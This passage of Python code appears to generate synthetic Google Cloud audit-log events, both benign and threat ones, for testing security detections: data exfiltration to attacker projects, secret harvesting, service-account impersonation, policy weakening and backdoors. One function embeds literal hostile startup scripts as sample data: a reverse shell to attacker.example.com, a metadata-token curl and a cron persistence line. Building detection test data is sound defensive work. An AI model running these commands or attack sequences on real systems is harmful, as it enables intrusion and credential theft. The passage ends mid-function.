    project_id = _get_project_id(config)
    region = _random_region(config)
    zone = _random_zone(region)
    instance = _get_random_gce_instance(config)
    disk_name = f"{instance}-data"
    snapshot_name = f"exfil-snapshot-{''.join(random.choices('abcdef0123456789', k=8))}"
    external_project = f"projects/{random.choice(_ATTACKER_DOMAINS).split('.')[0]}-proj-{''.join(random.choices('0123456789', k=6))}"
    op_id = str(uuid.uuid4())

    entry_create = _build_log_entry(
        project_id      = project_id,
        principal_email = p['email'],
        caller_ip       = p['caller_ip'],
        service_name    = "compute.googleapis.com",
        method_name     = "v1.compute.disks.createSnapshot",
        resource_name   = f"projects/{project_id}/zones/{zone}/disks/{disk_name}",
        resource_type   = "gce_disk",
        resource_labels = {"zone": zone, "disk_id": str(random.randint(1000000000000000, 9999999999999999))},
        log_type        = _LOG_ACTIVITY,
        operation_id    = op_id,
        request_body    = {
            "project":  project_id,
            "zone":     zone,
            "disk":     disk_name,
            "snapshot": {
                "name":        snapshot_name,
                "description": "Backup snapshot",
                "storageLocations": [region],
            },
        },
        offset_seconds  = -5,
    )

    entry_share = _build_log_entry(
        project_id      = project_id,
        principal_email = p['email'],
        caller_ip       = p['caller_ip'],
        service_name    = "compute.googleapis.com",
        method_name     = "v1.compute.snapshots.setIamPolicy",
        resource_name   = f"projects/{project_id}/global/snapshots/{snapshot_name}",
        resource_type   = "gce_snapshot",
        resource_labels = {"snapshot_id": str(random.randint(1000000000, 9999999999))},
        log_type        = _LOG_ACTIVITY,
        authorization_info = [
            {
                "resource":   f"projects/{project_id}/global/snapshots/{snapshot_name}",
                "permission": "compute.snapshots.setIamPolicy",
                "granted":    True,
                "resourceAttributes": {},
            }
        ],
        request_body = {
            "policy": {
                "bindings": [
                    {
                        "role":    "roles/compute.storageAdmin",
                        "members": [f"projectEditor:{external_project}"],
                    }
                ]
            },
        },
    )
    return [entry_create, entry_share]


def _gen_secret_mass_access(config, context=None):
    """
    THREAT: Rapid burst of AccessSecretVersion calls on sensitive secrets —
    credential harvesting pattern.
    Returns a list of 15–40 LogEntry events.
    """
    p = _get_random_principal(config, context)
    project_id = _get_project_id(config)
    gcp_conf = config.get(CONFIG_KEY, {})
    sensitive_secrets = gcp_conf.get('sensitive_secret_ids', [])

    if not sensitive_secrets:
        sensitive_secrets = [
            f"projects/{project_id}/secrets/db-prod-password",
            f"projects/{project_id}/secrets/api-signing-key",
            f"projects/{project_id}/secrets/payment-gateway-credentials",
        ]

    count = random.randint(15, 40)
    entries = []
    for i in range(count):
        secret = random.choice(sensitive_secrets)
        version = str(random.randint(1, 3))
        entry = _build_log_entry(
            project_id      = project_id,
            principal_email = p['email'],
            caller_ip       = p['caller_ip'],
            service_name    = "secretmanager.googleapis.com",
            method_name     = "google.cloud.secretmanager.v1.SecretManagerService.AccessSecretVersion",
            resource_name   = f"{secret}/versions/{version}",
            resource_type   = "audited_resource",
            resource_labels = {"service": "secretmanager.googleapis.com", "method": "google.cloud.secretmanager.v1.SecretManagerService.AccessSecretVersion"},
            log_type        = _LOG_DATA_ACCESS,
            offset_seconds  = i * random.uniform(0.2, 1.5), # type: ignore
            request_body    = {"name": f"{secret}/versions/{version}"},
        )
        entries.append(entry)
    return entries


def _gen_vertex_dataset_delete(config, context=None):
    """
    THREAT: Delete a Vertex AI dataset or model — ML data/model tampering.
    Analogous to AWS SAGEMAKER_DATASET_MODIFICATION.
    """
    p = _get_random_principal(config, context)
    project_id = _get_project_id(config)

    if random.random() < 0.5:
        resource = _get_random_vertex_dataset(config)
        method_name   = "google.cloud.aiplatform.v1.DatasetService.DeleteDataset"
        resource_type = "aiplatform.googleapis.com/Dataset"
        res_parts     = resource.split('/')
        res_labels    = {"dataset_id": res_parts[-1], "location": res_parts[3] if len(res_parts) > 3 else "us-central1"}
    else:
        resource = _get_random_vertex_model(config)
        method_name   = "google.cloud.aiplatform.v1.ModelService.DeleteModel"
        resource_type = "aiplatform.googleapis.com/Model"
        res_parts     = resource.split('/')
        res_labels    = {"model_id": res_parts[-1], "location": res_parts[3] if len(res_parts) > 3 else "us-central1"}

    entry = _build_log_entry(
        project_id      = project_id,
        principal_email = p['email'],
        caller_ip       = p['caller_ip'],
        service_name    = "aiplatform.googleapis.com",
        method_name     = method_name,
        resource_name   = resource,
        resource_type   = resource_type,
        resource_labels = res_labels,
        log_type        = _LOG_ACTIVITY,
        request_body    = {"name": resource},
    )
    return [entry]


def _gen_disable_scc(config, context=None):
    """
    THREAT: Delete a Security Command Center notification config —
    silences real-time threat alerts from SCC.
    Analogous to AWS DISABLE_SECURITY_HUB.
    """
    p = _get_random_principal(config, context)
    project_id = _get_project_id(config)
    gcp_conf = config.get(CONFIG_KEY, {})
    org_id = gcp_conf.get('organization_id') or "123456789012"
    config_name = random.choice(["siem-alert-config", "xdr-notification", "security-alerts-prod"])

    entry = _build_log_entry(
        project_id      = project_id,
        principal_email = p['email'],
        caller_ip       = p['caller_ip'],
        service_name    = "securitycenter.googleapis.com",
        method_name     = "google.cloud.securitycenter.v1.SecurityCenter.DeleteNotificationConfig",
        resource_name   = f"organizations/{org_id}/notificationConfigs/{config_name}",
        resource_type   = "organization",
        resource_labels = {"organization_id": org_id},
        log_type        = _LOG_ACTIVITY,
        request_body    = {"name": f"organizations/{org_id}/notificationConfigs/{config_name}"},
    )
    return [entry]


def _gen_vm_metadata_modify(config, context=None):
    """
    THREAT: Set compute instance metadata with a startup-script key —
    script injection / persistence mechanism.
    """
    p = _get_random_principal(config, context)
    project_id = _get_project_id(config)
    region = _random_region(config)
    zone = _random_zone(region)
    instance = _get_random_gce_instance(config)
    instance_id = str(random.randint(1000000000000000, 9999999999999999))

    # Redacted script value — real payload would be here
    script_snippets = [
        "#!/bin/bash\ncurl -s http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token | ...",
        "#!/bin/bash\ncrontab -l | { cat; echo '*/5 * * * * /tmp/.x &'; } | crontab -",
        "#!/bin/bash\nbash -i >& /dev/tcp/attacker.example.com/4444 0>&1",
    ]

    entry = _build_log_entry(
        project_id      = project_id,
        principal_email = p['email'],
        caller_ip       = p['caller_ip'],
        service_name    = "compute.googleapis.com",
        method_name     = "v1.compute.instances.setMetadata",
        resource_name   = f"projects/{project_id}/zones/{zone}/instances/{instance}",
        resource_type   = "gce_instance",
        resource_labels = {"zone": zone, "instance_id": instance_id},
        log_type        = _LOG_ACTIVITY,
        request_body    = {
            "project":  project_id,
            "zone":     zone,
            "instance": instance,
            "metadata": {
                "items": [
                    {"key": "startup-script", "value": random.choice(script_snippets)},
                ]
            },
        },
    )
    return [entry]


def _gen_sa_impersonation(config, context=None):
    """
    THREAT: Service account impersonation — generateAccessToken call on a
    privileged SA. Enables token theft and privilege escalation.
    Returns 2 events: GetServiceAccount (recon) + GenerateAccessToken (impersonation).
    Caller and target SA are always distinct identities.
    """
    p = _get_random_principal(config, context)
    project_id = _get_project_id(config)

    # Ensure target SA is always a different identity from the caller
    gcp_conf = config.get(CONFIG_KEY, {})
    all_sas  = gcp_conf.get('service_accounts', [])
    candidates = [sa for sa in all_sas if sa != p['email']]
    if candidates:
        target_sa = random.choice(candidates)
    else:
        # Fallback: synthesise a distinct SA name
        target_sa = f"privileged-sa@{project_id}.iam.gserviceaccount.com"

    # Shared unique_id for the target SA (consistent across both events)
    target_unique_id = str(random.randint(100000000000, 999999999999))
    op_id = str(uuid.uuid4())

    # Event 1: reconnaissance — read the target SA metadata before impersonating
    entry_actas = _build_log_entry(
        project_id      = project_id,
        principal_email = p['email'],
        caller_ip       = p['caller_ip'],
        service_name    = "iam.googleapis.com",
        method_name     = "google.iam.admin.v1.GetServiceAccount",
        resource_name   = f"projects/{project_id}/serviceAccounts/{target_sa}",
        resource_type   = "service_account",
        resource_labels = {"email_id": target_sa, "unique_id": target_unique_id},
        log_type        = _LOG_DATA_ACCESS,
        operation_id    = op_id,
        request_body    = {"name": f"projects/{project_id}/serviceAccounts/{target_sa}"},
        offset_seconds  = -2,
    )

    # Event 2: impersonation — generate a short-lived access token for the target SA
    # GenerateAccessToken uses permission iam.serviceAccounts.getAccessToken (DATA_READ)
    # real GCP routes this to cloudaudit.googleapis.com%2Fdata_access, not %2Factivity
    entry_token = _build_log_entry(
        project_id      = project_id,
        principal_email = p['email'],
        caller_ip       = p['caller_ip'],
        service_name    = "iamcredentials.googleapis.com",
        method_name     = "google.iam.credentials.v1.IAMCredentials.GenerateAccessToken",
        resource_name   = f"projects/-/serviceAccounts/{target_sa}",
        resource_type   = "service_account",
        resource_labels = {"email_id": target_sa, "unique_id": target_unique_id},
        log_type        = _LOG_DATA_ACCESS,
        operation_id    = op_id,
        authorization_info = [
            {
                "resource":   f"projects/-/serviceAccounts/{target_sa}",
                "permission": "iam.serviceAccounts.getAccessToken",
                "granted":    True,
                "resourceAttributes": {},
            }
        ],
        request_body = {
            "name":     f"projects/-/serviceAccounts/{target_sa}",
            "scope":    ["https://www.googleapis.com/auth/cloud-platform"],
            "lifetime": "3600s",
        },
    )
    return [entry_actas, entry_token]


def _gen_cross_project_sa_grant(config, context=None):
    """
    THREAT: SetIamPolicy adding a service account from an external/unknown
    project to the current project. Cross-project lateral movement.
    Analogous to AWS CROSS_ACCOUNT_ASSUME_ROLE.
    """
    p = _get_random_principal(config, context)
    project_id = _get_project_id(config)
    external_project = f"attacker-proj-{''.join(random.choices('0123456789', k=7))}"
    external_sa = f"pivot-sa@{external_project}.iam.gserviceaccount.com"
    granted_role = random.choice(["roles/viewer", "roles/editor", "roles/container.developer", "roles/storage.objectAdmin"])

    entry = _build_log_entry(
        project_id      = project_id,
        principal_email = p['email'],
        caller_ip       = p['caller_ip'],
        service_name    = "cloudresourcemanager.googleapis.com",
        method_name     = "SetIamPolicy",
        resource_name   = f"projects/{project_id}",
        resource_type   = "project",
        resource_labels = {},
        log_type        = _LOG_ACTIVITY,
        authorization_info = [
            {
                "resource":   f"projects/{project_id}",
                "permission": "resourcemanager.projects.setIamPolicy",
                "granted":    True,
                "resourceAttributes": {},
            }
        ],
        request_body = {
            "resource": f"projects/{project_id}",
            "policy": {
                "bindings": [
                    {
                        "role":    granted_role,
                        "members": [f"serviceAccount:{external_sa}"],
                    }
                ],
                "version": 1,
            },
        },
        service_data = {
            "@type": "type.googleapis.com/google.iam.v1.logging.AuditData",
            "policyDelta": {
                "bindingDeltas": [
                    {"action": "ADD", "role": granted_role, "member": f"serviceAccount:{external_sa}"},
                ],
            },
        },
    )
    return [entry]


# ---------------------------------------------------------------------------
# New Threat Generators (Steps 5 + 8)
# ---------------------------------------------------------------------------

def _gen_kms_key_destroy(config, context=None):
    """
    THREAT: Destroy a KMS CryptoKeyVersion — makes CMEK-encrypted data unreadable.
    Defense Evasion / Impact.
    """
    p = _get_random_principal(config, context)
    project_id = _get_project_id(config)
    region = _random_region(config)
    keyring = _get_random_kms_keyring(config)
    key_name = _get_random_kms_key(config, keyring)
    resource_name = (
        f"projects/{project_id}/locations/{region}"
        f"/keyRings/{keyring}/cryptoKeys/{key_name}/cryptoKeyVersions/1"
    )

    entry = _build_log_entry(
        project_id      = project_id,
        principal_email = p['email'],
        caller_ip       = p['caller_ip'],
        service_name    = "cloudkms.googleapis.com",
        method_name     = "google.cloud.kms.v1.KeyManagementService.DestroyCryptoKeyVersion",
        resource_name   = resource_name,
        resource_type   = "cloudkms_cryptokey",
        resource_labels = {"location": region, "key_ring_id": keyring, "crypto_key_id": key_name},
        log_type        = _LOG_ACTIVITY,
        request_body    = {"name": resource_name},
        response_body   = {
            "state":       "DESTROY_SCHEDULED",
            "destroyTime": _gcp_timestamp(offset_seconds=86400 * 30),
        },
    )
    return [entry]


def _gen_bigquery_data_exfil(config, context=None):
    """
    THREAT: Full-table SELECT followed by EXPORT to attacker-controlled GCS bucket.
    Exfiltration — two events: query (DATA_ACCESS) + extract job (ACTIVITY).
    """
    p = _get_random_principal(config, context)
    project_id = _get_project_id(config)
    region = _random_region(config)
    dataset = _get_random_bq_dataset(config)
    table = random.choice(["users", "transactions", "credentials", "pii_records", "customer_data"])
    attacker_bucket = f"{random.choice(_ATTACKER_DOMAINS).split('.')[0]}-exfil-{random.randint(1000, 9999)}"
    hex_id = uuid.uuid4().hex[:8]
    job_id_query   = f"bqjob_{uuid.uuid4().hex[:16]}"
    job_id_extract = f"bqjob_{uuid.uuid4().hex[:16]}"
    # Shared operation_id links both jobs as one correlated exfil sequence in XSIAM
    op_id = str(uuid.uuid4())

    e1 = _build_log_entry(
        project_id      = project_id,
        principal_email = p['email'],
        caller_ip       = p['caller_ip'],
        service_name    = "bigquery.googleapis.com",
        method_name     = "google.cloud.bigquery.v2.JobService.InsertJob",
        resource_name   = f"projects/{project_id}/jobs/{job_id_query}",
        resource_type   = "bigquery_project",
        resource_labels = {"project_id": project_id, "location": region},
        log_type        = _LOG_ACTIVITY,
        operation_id    = op_id,
        offset_seconds  = -10,
        request_body    = {
            "configuration": {
                "query": {
                    "query":    f"SELECT * FROM `{project_id}.{dataset}.{table}`",
                    "useLegacySql": False,
                }
            },
            "jobReference": {"projectId": project_id, "jobId": job_id_query},
        },
    )
    e2 = _build_log_entry(
        project_id      = project_id,
        principal_email = p['email'],
        caller_ip       = p['caller_ip'],
        service_name    = "bigquery.googleapis.com",
        method_name     = "google.cloud.bigquery.v2.JobService.InsertJob",
        resource_name   = f"projects/{project_id}/jobs/{job_id_extract}",
        resource_type   = "bigquery_project",
        resource_labels = {"project_id": project_id, "location": region},
        log_type        = _LOG_ACTIVITY,
        operation_id    = op_id,
        request_body    = {
            "configuration": {
                "extract": {
                    "sourceTable":    {"projectId": project_id, "datasetId": dataset, "tableId": table},
                    "destinationUris": [f"gs://{attacker_bucket}/exfil/{hex_id}/*.csv"],
                    "destinationFormat": "CSV",
                }
            },
            "jobReference": {"projectId": project_id, "jobId": job_id_extract},
        },
    )
    return [e1, e2]


def _gen_project_delete(config, context=None):
    """
    THREAT: Schedule project deletion — highest blast-radius GCP action.
    Impact. Weight 1 (rarest).
    """
    p = _get_random_principal(config, context)
    project_id = _get_project_id(config)

    entry = _build_log_entry(
        project_id      = project_id,
        principal_email = p['email'],
        caller_ip       = p['caller_ip'],
        service_name    = "cloudresourcemanager.googleapis.com",
        method_name     = "DeleteProject",
        resource_name   = f"projects/{project_id}",
        resource_type   = "project",
        resource_labels = {},
        log_type        = _LOG_ACTIVITY,
        request_body    = {"name": f"projects/{project_id}"},
        response_body   = {
            "state":      "DELETE_REQUESTED",
            "deleteTime": _gcp_timestamp(),
        },
    )
    return [entry]


def _gen_external_user_added(config, context=None):
    """
    THREAT: Bind a gmail/protonmail/outlook identity to roles/editor.
    Persistence — distinct from IAM_PRIVILEGE_ESCALATION (which uses SA + owner/securityAdmin).
    """
    p = _get_random_principal(config, context)
    project_id = _get_project_id(config)
    external_member = f"user:{random.choice(_EXTERNAL_GMAIL_ACCOUNTS)}"

    entry = _build_log_entry(
        project_id      = project_id,
        principal_email = p['email'],
        caller_ip       = p['caller_ip'],
        service_name    = "cloudresourcemanager.googleapis.com",
        method_name     = "SetIamPolicy",
        resource_name   = f"projects/{project_id}",
        resource_type   = "project",
        resource_labels = {},
        log_type        = _LOG_ACTIVITY,
        authorization_info = [
            {
                "resource":   f"projects/{project_id}",
                "permission": "resourcemanager.projects.setIamPolicy",
                "granted":    True,
                "resourceAttributes": {},
            }
        ],
        request_body = {
            "resource": f"projects/{project_id}",
            "policy": {
                "bindings": [
                    {"role": "roles/editor", "members": [external_member]},
                ],
                "version": 1,
            },
        },
        service_data = {
            "@type": "type.googleapis.com/google.iam.v1.logging.AuditData",
            "policyDelta": {
                "bindingDeltas": [
                    {"action": "ADD", "role": "roles/editor", "member": external_member},
                ],
            },
        },
    )
    return [entry]


def _gen_org_policy_modify(config, context=None):
    """
    THREAT: Weaken or delete an org policy security constraint.
    Defense Evasion — removes guardrails enforced at org level.
    """
    p = _get_random_principal(config, context)
    project_id = _get_project_id(config)
    gcp_conf = config.get(CONFIG_KEY, {})
    org_id = gcp_conf.get('organization_id') or "123456789012"
    constraint = random.choice(_SECURITY_CONSTRAINTS)
    # Policy URL path uses constraint short name (no "constraints/" prefix)
    constraint_short = constraint.replace("constraints/", "", 1)
    policy_name = f"organizations/{org_id}/policies/{constraint_short}"

    if random.random() < 0.7:
        method_name  = "google.cloud.orgpolicy.v2.OrgPolicy.UpdatePolicy"
        request_body = {
            "policy": {
                "name": policy_name,
                "spec": {"rules": [{"allowAll": True}]},
            }
        }
    else:
        method_name  = "google.cloud.orgpolicy.v2.OrgPolicy.DeletePolicy"
        request_body = {"name": policy_name}

    entry = _build_log_entry(
        project_id      = project_id,
        principal_email = p['email'],
        caller_ip       = p['caller_ip'],
        service_name    = "orgpolicy.googleapis.com",
        method_name     = method_name,
        resource_name   = policy_name,
        resource_type   = "organization",
        resource_labels = {"organization_id": org_id},
        log_type        = _LOG_ACTIVITY,
        request_body    = request_body,
    )
    return [entry]


def _gen_cloud_function_malicious_deploy(config, context=None):
    """
    THREAT: Deploy a Cloud Function with C2 environment variables.
    Execution / Persistence.
    """
    p = _get_random_principal(config, context)
    project_id = _get_project_id(config)
    region = _random_region(config)
    fn_name = f"backdoor-{uuid.uuid4().hex[:8]}"

    method_name = random.choice([
        "google.cloud.functions.v2.FunctionService.CreateFunction",
        "google.cloud.functions.v2.FunctionService.UpdateFunction",
    ])

    entry = _build_log_entry(
        project_id      = project_id,
        principal_email = p['email'],
        caller_ip       = p['caller_ip'],
        service_name    = "cloudfunctions.googleapis.com",
        method_name     = method_name,
        resource_name   = f"projects/{project_id}/locations/{region}/functions/{fn_name}",
        resource_type   = "cloud_function",
        resource_labels = {"region": region, "function_name": fn_name},
        log_type        = _LOG_ACTIVITY,
        request_body    = {
            "function": {
                "name": f"projects/{project_id}/locations/{region}/functions/{fn_name}",
                "serviceConfig": {
                    "environmentVariables": {
                        "C2_ENDPOINT": f"http://{_random_external_ip()}:8080/cmd",
                    },
                    "availableMemory": "256Mi",
                    "timeoutSeconds":  540,
                },
                "buildConfig": {
                    "runtime":     "python311",
                    "entryPoint":  "main",
                },
            }
        },
    )
    return [entry]


def _gen_sql_instance_public(config, context=None):
    """
    THREAT: Enable public IP and allow 0.0.0.0/0 on a Cloud SQL instance.
    Initial Access — exposes database to internet.
    """
    p = _get_random_principal(config, context)
    project_id = _get_project_id(config)
    region = _random_region(config)
    instance = _get_random_sql_instance(config)

    entry = _build_log_entry(
        project_id      = project_id,
        principal_email = p['email'],
        caller_ip       = p['caller_ip'],
        service_name    = "sqladmin.googleapis.com",
        method_name     = "google.cloud.sql.v1.SqlInstancesService.Patch",
        resource_name   = f"projects/{project_id}/instances/{instance}",
        resource_type   = "cloudsql_database",
        resource_labels = {"database_id": f"{project_id}:{instance}", "region": region},
        log_type        = _LOG_ACTIVITY,
        request_body    = {
            "project":  project_id,
            "instance": instance,
            "body": {
                "settings": {
                    "ipConfiguration": {
                        "ipv4Enabled": True,
                        "requireSsl":  False,
                        "authorizedNetworks": [
                            {"value": "0.0.0.0/0", "name": "allow-all"},
                        ],
                    }
                }
            },
        },
    )
    return [entry]


def _gen_compute_image_exfil(config, context=None):
    """
    THREAT: Create a disk image then share it to an external project.
    Exfiltration — two events mirroring _gen_snapshot_exfil pattern.
    """
    p = _get_random_principal(config, context)
    project_id = _get_project_id(config)
    region = _random_region(config)
    zone = _random_zone(region)
    instance = _get_random_gce_instance(config)
    image_name = f"exfil-image-{uuid.uuid4().hex[:8]}"
    image_id   = str(random.randint(1000000000000000, 9999999999999999))
    external_project = f"attacker-proj-{''.join(random.choices('0123456789', k=7))}"

    e1 = _build_log_entry(
        project_id      = project_id,
        principal_email = p['email'],
        caller_ip       = p['caller_ip'],
        service_name    = "compute.googleapis.com",
        method_name     = "v1.compute.images.insert",
        resource_name   = f"projects/{project_id}/global/images/{image_name}",
        resource_type   = "gce_image",
        resource_labels = {"project_id": project_id, "image_id": image_id},
        log_type        = _LOG_ACTIVITY,
        offset_seconds  = -8,
        request_body    = {
            "name":       image_name,
            "sourceDisk": f"projects/{project_id}/zones/{zone}/disks/{instance}-disk",
        },
    )
    e2 = _build_log_entry(
        project_id      = project_id,
        principal_email = p['email'],
        caller_ip       = p['caller_ip'],
        service_name    = "compute.googleapis.com",
        method_name     = "v1.compute.images.setIamPolicy",
        resource_name   = f"projects/{project_id}/global/images/{image_name}",
        resource_type   = "gce_image",
        resource_labels = {"project_id": project_id, "image_id": image_id},
        log_type        = _LOG_ACTIVITY,
        request_body    = {
            "policy": {
                "bindings": [
                    {
                        "role":    "roles/compute.imageUser",
                        "members": [f"projectEditor:{external_project}"],
                    }
                ]
            },
        },
    )
    return [e1, e2]


def _gen_cloud_armor_delete(config, context=None):
    """
    THREAT: Delete a Cloud Armor WAF security policy.
    Defense Evasion — analogous to AWS DELETE_WAF_RULE.
    """
    p = _get_random_principal(config, context)
    project_id = _get_project_id(config)
    policy = _get_random_cloud_armor_policy(config)

    entry = _build_log_entry(
        project_id      = project_id,
        principal_email = p['email'],
        caller_ip       = p['caller_ip'],
        service_name    = "compute.googleapis.com",
        method_name     = "v1.compute.securityPolicies.delete",
        resource_name   = f"projects/{project_id}/global/securityPolicies/{policy}",
        resource_type   = "project",
        resource_labels = {},
        log_type        = _LOG_ACTIVITY,
        request_body    = {"project": project_id, "securityPolicy": policy},
    )
    return [entry]


def _gen_vpc_peering_backdoor(config, context=None):
    """
    THREAT: Add VPC peering to an unknown external project network.
    Lateral Movement — establishes private connectivity to attacker-controlled VPC.
    """
    p = _get_random_principal(config, context)
    project_id = _get_project_id(config)
    network = _get_random_vpc_network(config)
    external_project = f"attacker-proj-{''.join(random.choices('0123456789', k=7))}"
    external_network = f"projects/{external_project}/global/networks/default"

    entry = _build_log_entry(
        project_id      = project_id,
        principal_email = p['email'],
        caller_ip       = p['caller_ip'],
        service_name    = "compute.googleapis.com",
        method_name     = "v1.compute.networks.addPeering",
        resource_name   = f"projects/{project_id}/global/networks/{network}",
        resource_type   = "gce_network",
        resource_labels = {"network_id": str(random.randint(100000000000000000, 999999999999999999))},
        log_type        = _LOG_ACTIVITY,
        request_body    = {
            "project": project_id,
            "network": network,
            "networkPeeringAddRequest": {
                "networkPeering": {
                    "name":                 f"backdoor-peer-{uuid.uuid4().hex[:8]}",
                    "network":              external_network,
                    "exportCustomRoutes":   True,
                    "importCustomRoutes":   True,
                }
            },
        },
    )
    return [entry]


# ---------------------------------------------------------------------------
# Vertex AI Threat Generators (Step 8)
# ---------------------------------------------------------------------------

def _gen_vertex_predict(config, context=None):
    """Benign: Call Vertex AI prediction endpoint."""
    p = _get_random_principal(config, context)
    project_id = _get_project_id(config)
    endpoint = _get_random_vertex_endpoint(config)
    parts = endpoint.split('/')
    endpoint_id = parts[-1]
    location = parts[3] if len(parts) > 3 else _random_region(config)

    entry = _build_log_entry(
        project_id      = project_id,
        principal_email = p['email'],
        caller_ip       = p['caller_ip'],
        service_name    = "aiplatform.googleapis.com",
        method_name     = "google.cloud.aiplatform.v1.PredictionService.Predict",
        resource_name   = endpoint,
        resource_type   = "aiplatform.googleapis.com/Endpoint",
        resource_labels = {"endpoint_id": endpoint_id, "location": location},
        log_type        = _LOG_DATA_ACCESS,
        request_body    = {
            "instances":  [{"content": "Sample inference input"}],
            "parameters": {
                "temperature":    round(random.uniform(0.1, 0.9), 1),
                "maxOutputTokens": random.choice([256, 512, 1024]),
            },
        },
    )
    return [entry]


def _gen_vertex_generate_content(config, context=None):
    """Benign: Generate content via Gemini model (PredictionService.GenerateContent)."""
    p = _get_random_principal(config, context)
    project_id = _get_project_id(config)
    model = _get_random_gemini_model(config)

    entry = _build_log_entry(
        project_id      = project_id,
        principal_email = p['email'],
        caller_ip       = p['caller_ip'],
        service_name    = "aiplatform.googleapis.com",
        method_name     = "google.cloud.aiplatform.v1.PredictionService.GenerateContent",
        resource_name   = model,
        resource_type   = "audited_resource",
        resource_labels = {"service": "aiplatform.googleapis.com", "method": "google.cloud.aiplatform.v1.PredictionService.GenerateContent"},
        log_type        = _LOG_DATA_ACCESS,
        request_body    = {
            "contents": [
                {
                    "role": "user",
                    "parts": [{"text": random.choice([
                        "Summarize the following document...",
                        "Explain the key risks in this report.",
                        "Translate this text to Spanish.",
                        "Write a SQL query to find all orders over $1000.",
                    ])}],
                }
            ],
            "generationConfig": {
                "temperature":    round(random.uniform(0.1, 0.9), 1),
                "maxOutputTokens": random.choice([1024, 2048, 4096]),
            },
        },
    )
    return [entry]


def _gen_vertex_list_training_jobs(config, context=None):
    """Benign: List Vertex AI custom training jobs."""
    p = _get_random_principal(config, context)
    project_id = _get_project_id(config)
    region = _random_region(config)

    entry = _build_log_entry(
        project_id      = project_id,
        principal_email = p['email'],
        caller_ip       = p['caller_ip'],
        service_name    = "aiplatform.googleapis.com",
        method_name     = "google.cloud.aiplatform.v1.JobService.ListCustomJobs",
        resource_name   = f"projects/{project_id}/locations/{region}",
        resource_type   = "audited_resource",
        resource_labels = {"service": "aiplatform.googleapis.com", "method": "google.cloud.aiplatform.v1.JobService.ListCustomJobs"},
        log_type        = _LOG_DATA_ACCESS,
        request_body    = {"parent": f"projects/{project_id}/locations/{region}"},
    )
    return [entry]


def _gen_vertex_batch_predict(config, context=None):
    """Benign: Create a Vertex AI batch prediction job."""
    p = _get_random_principal(config, context)
    project_id = _get_project_id(config)
    region = _random_region(config)
    model = _get_random_vertex_model(config)
    job_name = f"batch-predict-{uuid.uuid4().hex[:8]}"
    output_bucket = _get_random_gcs_bucket(config)

    entry = _build_log_entry(
        project_id      = project_id,
        principal_email = p['email'],
        caller_ip       = p['caller_ip'],
        service_name    = "aiplatform.googleapis.com",
        method_name     = "google.cloud.aiplatform.v1.JobService.CreateBatchPredictionJob",
        resource_name   = f"projects/{project_id}/locations/{region}/batchPredictionJobs/{job_name}",
        resource_type   = "aiplatform.googleapis.com/BatchPredictionJob",
        resource_labels = {"batch_prediction_job_id": job_name, "location": region},
        log_type        = _LOG_ACTIVITY,
        request_body    = {
            "displayName": job_name,
            "model":       model,
            "inputConfig": {
                "instancesFormat": "jsonl",
                "gcsSource": {"uris": [f"gs://{output_bucket}/batch-input/*.jsonl"]},
            },
            "outputConfig": {
                "predictionsFormat": "jsonl",
                "gcsDestination": {"outputUriPrefix": f"gs://{output_bucket}/batch-output/"},
            },
        },
    )
    return [entry]


def _gen_vertex_denial_of_wallet(config, context=None):
    """
    THREAT: Burst 20-50 Vertex AI prediction calls — Denial of Wallet.
    Analogous to BEDROCK_DENIAL_OF_WALLET.
    """
    p = _get_random_principal(config, context)
    project_id = _get_project_id(config)
    endpoint = _get_random_vertex_endpoint(config)
    count = random.randint(20, 50)
    use_gemini = random.random() < 0.5
    model = _get_random_gemini_model(config) if use_gemini else endpoint
    method = ("google.cloud.aiplatform.v1.PredictionService.GenerateContent"
              if use_gemini else
              "google.cloud.aiplatform.v1.PredictionService.Predict")

    # Endpoint calls use specific resource type; publisher model calls use audited_resource
    if use_gemini:
        res_type   = "audited_resource"
        res_labels = {"service": "aiplatform.googleapis.com", "method": method}
    else:
        ep_parts   = endpoint.split('/')
        res_type   = "aiplatform.googleapis.com/Endpoint"
        res_labels = {"endpoint_id": ep_parts[-1], "location": ep_parts[3] if len(ep_parts) > 3 else "us-central1"}

    events = []
    for i in range(count):
        # Spread burst across 0–60 s so time-window burst detection fires correctly
        offset = i * random.uniform(0.5, 3.0)
        e = _build_log_entry(
            project_id      = project_id,
            principal_email = p['email'],
            caller_ip       = p['caller_ip'],
            service_name    = "aiplatform.googleapis.com",
            method_name     = method,
            resource_name   = model,
            resource_type   = res_type,
            resource_labels = res_labels,
            log_type        = _LOG_DATA_ACCESS,
            request_body    = {"instances": [{"content": "DoW burst request"}]},
            offset_seconds  = offset, # type: ignore
        )
        events.append(e)
    return events


def _gen_vertex_model_exfil(config, context=None):
    """
    THREAT: Export a Vertex AI model to an attacker-controlled GCS bucket.
    Exfiltration — analogous to SAGEMAKER_DATASET_MODIFICATION.
    """
    p = _get_random_principal(config, context)
    project_id = _get_project_id(config)
    model = _get_random_vertex_model(config)
    attacker_bucket = f"{random.choice(_ATTACKER_DOMAINS).split('.')[0]}-model-exfil-{random.randint(1000, 9999)}"

    model_parts = model.split('/')
    model_id  = model_parts[-1]
    model_loc = model_parts[3] if len(model_parts) > 3 else _random_region(config)

    entry = _build_log_entry(
        project_id      = project_id,
        principal_email = p['email'],
        caller_ip       = p['caller_ip'],
        service_name    = "aiplatform.googleapis.com",
        method_name     = "google.cloud.aiplatform.v1.ModelService.ExportModel",
        resource_name   = model,
        resource_type   = "aiplatform.googleapis.com/Model",
        resource_labels = {"model_id": model_id, "location": model_loc},
        log_type        = _LOG_ACTIVITY,
        request_body    = {
            "name": model,
            "outputConfig": {
                "exportFormatId": "custom-trained",
                "artifactDestination": {
                    "outputUriPrefix": f"gs://{attacker_bucket}/model-exfil/",
                },
            },
        },
    )
    return [entry]


def _gen_vertex_training_malicious(config, context=None):
    """
    THREAT: Submit a Vertex AI custom training job with a suspicious container image.
    Execution — analogous to BEDROCK_UNUSUAL_MODEL_ACCESS.
    """
    p = _get_random_principal(config, context)
    project_id = _get_project_id(config)
    region = _random_region(config)
    job_name = f"custom-job-{uuid.uuid4().hex[:8]}"
    image = random.choice(_SUSPICIOUS_CONTAINER_IMAGES)

    worker_spec = {
        "machineSpec": {"machineType": "n1-standard-8", "acceleratorType": "NVIDIA_TESLA_T4", "acceleratorCount": 1},
        "replicaCount": 1,
        "containerSpec": {
            "imageUri": image,
            "args":     ["--epochs=100", "--output=/tmp/out"],
        },
    }
    if random.random() < 0.6:
        worker_spec["containerSpec"]["env"] = [
            {"name": "C2_ENDPOINT", "value": f"http://{_random_external_ip()}:8080/cmd"},
        ]

    entry = _build_log_entry(
